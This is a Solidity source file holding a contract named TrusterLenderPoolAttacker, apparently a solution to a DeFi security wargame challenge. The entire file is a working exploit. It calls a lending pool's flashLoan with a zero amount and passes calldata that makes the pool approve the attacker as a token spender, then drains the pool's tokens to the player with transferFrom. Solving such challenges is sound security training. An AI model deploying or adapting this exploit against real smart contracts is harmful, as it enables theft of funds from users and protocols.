// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract TrusterLenderPoolAttacker {
    
    function attack(address token, address pool, address player, uint256 amount) public {        
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        ITrusterLenderPool(pool).flashLoan(0, player, token, data);

        IERC20(token).transferFrom(pool, player, amount);        
    }
}